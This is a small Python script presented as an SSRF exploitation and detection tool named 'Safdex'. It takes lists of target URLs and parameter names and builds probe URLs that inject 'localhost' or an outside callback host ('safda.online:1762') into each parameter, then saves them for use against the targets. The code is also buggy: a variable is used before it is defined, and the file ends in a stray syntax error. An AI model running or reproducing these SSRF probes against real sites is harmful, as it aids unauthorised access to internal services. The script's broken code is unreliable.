import requests as req;
print("Safdx")
print("-------------------------------------------------------")
print("------------------------------------------------")
print("-----------------------------------------")
print("----------------------------------")
print("---------------------------")
print("------------------")
print("---------")
print("Safdex is an one script to exploite and detect SSRF vulnerbility and created by Milad Safdari");
a=True;
while a:
    # ipu1 = input("Target address : ")
    ipu1="./source/targets.txt"
    try:
        targets=open(str(ipu1), "r")
    except:
        print("we can't find your target directory ! plese try again ")
        continue;
    if (ipu1 != ""):
        urls=open(ipu1,"r").readlines()
        ipu = input(
            "do you want to use difault parameters or costume for costume enter 'C' for default enter else : ")
        while (ipu == "c" or ipu == "C"):
            dir_parameters = input("plese enter your parameters directory  : ")
            try:
                params = open(dir_parameters, "r").readlines()
            except:
                print("we can't find your `Parameters` directory ! plese try again  ")
                continue

            # le's start write the basic code

            v=1
            for url in urls:
                value=1;
                for param in params:
                    url=url.replace("\n","")
                    param=param.replace("\n","")
                    main=v," - ",value," : " + url + "&"+param+"="+"localhost"
                    print(main);
                    value=value+1;
                    result=open("./result/result.txt","a");
                    result.write(url + "&"+param+"="+"localhost");
                v=1+v;
            result.close()
            if (inp2 == "e"):
                print("bay :)")
                exit()
        params = open("./source/params.txt", "r").readlines()

        ## let's start to write basic code

        v=1
        for url in urls:
            value=1
            for param in params:
                url=url.replace("\n","")
                param=param.replace("\n","")
                main=v," - ",value," : " + url + "&"+param+"="+"safda.online:1762"
                print(main);
                value=value+1;
                result=open("./result/result.txt","a");
                result.write(url + "&"+param+"="+"safda.online:1762");
            v=1+v;
    result.close()
    inp2=input("TO exit press 'e' : ")
    if (inp2=="e"):
        break;
print("bay :)")
exit();milad